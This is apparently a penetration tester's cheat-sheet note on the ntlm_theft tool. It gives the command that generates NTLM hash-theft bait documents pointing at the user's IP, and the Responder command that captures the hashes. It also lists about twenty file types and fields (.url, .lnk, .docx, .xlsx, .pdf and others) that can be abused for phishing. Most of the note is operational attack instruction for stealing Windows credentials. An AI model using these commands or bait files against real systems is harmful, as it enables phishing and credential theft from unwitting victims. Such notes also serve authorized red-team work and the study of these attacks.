--- ---

<h2>Commands</h2>

Top Command
```
python3 ntlm_theft.py -g all -s 127.0.0.1 -f DOCUMENT-NAME
```

- -g all            ---> Mean to generate all the type of extension
- -s IP             ---> Your IP
- -f                  ---> The name of the document


Take note that you need to lunch responder to catch the response
```
sudo responder -I <interface>
```

- -I                    ---> Interface your using

---
<h2>What is NTLM Theft</h2>

NTLM_Theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.

More in dept, NTLM file ask where can it find the folder icon. This Folder icon folder is saying you can find it on our host, we can then capture the NTLM!

![[Pasted image 20221227221049.png]]


ntlm_theft supports the following attack types:

-   Browse to Folder Containing
    -   .url – via URL field
    -   .url – via ICONFILE field
    -   .lnk - via icon_location field
    -   .scf – via ICONFILE field (Not Working on Latest Windows)
    -   autorun.inf via OPEN field (Not Working on Latest Windows)
    -   desktop.ini - via IconResource field (Not Working on Latest Windows)
-   Open Document
    -   .xml – via Microsoft Word external stylesheet
    -   .xml – via Microsoft Word includepicture field
    -   .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
    -   .docx – via Microsoft Word includepicture field
    -   .docx – via Microsoft Word external template
    -   .docx – via Microsoft Word frameset webSettings
    -   .xlsx - via Microsoft Excel external cell
    -   .wax - via Windows Media Player playlist (Better, primary open)
    -   .asx – via Windows Media Player playlist (Better, primary open)
    -   .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
    -   .jnlp – via Java external jar
    -   .application – via any Browser (Must be served via a browser downloaded or won’t run)
-   Open Document and Accept Popup
    -   .pdf – via Adobe Acrobat Reader
-   Click Link in Chat Program
    -   .txt – formatted link to paste into Zoom chat


---

<h2>More Information</h2>

More information ---> https://github.com/Greenwolf/ntlm_theft

<iframe src="https://github.com/Greenwolf/ntlm_theft" width="100%" height="1300"></iframe>